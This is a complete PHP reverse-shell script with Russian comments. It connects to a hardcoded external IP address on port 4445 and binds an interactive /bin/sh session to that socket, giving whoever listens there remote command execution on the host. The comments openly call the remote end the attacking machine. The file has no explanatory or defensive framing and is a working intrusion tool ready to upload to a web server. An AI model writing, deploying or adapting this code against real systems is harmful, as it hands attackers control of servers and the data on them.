<?php
set_time_limit(0);
$ip   = '94.142.138.201';
$port = 4445;

// Открываем сокет к атакующей машине
$sock = fsockopen($ip, $port, $errno, $errstr, 30)
    or die("[-] Не удалось подключиться: $errstr ($errno)\n");

// Запускаем /bin/sh, перенаправляя stdin/stdout/stderr в сокет
$descriptorspec = [
    0 => ['socket', $sock, 'r'],  // STDIN
    1 => ['socket', $sock, 'w'],  // STDOUT
    2 => ['socket', $sock, 'w'],  // STDERR
];

$proc = proc_open('/bin/sh -i', $descriptorspec, $pipes);
if (is_resource($proc)) {
    proc_close($proc);
}
fclose($sock);
?>
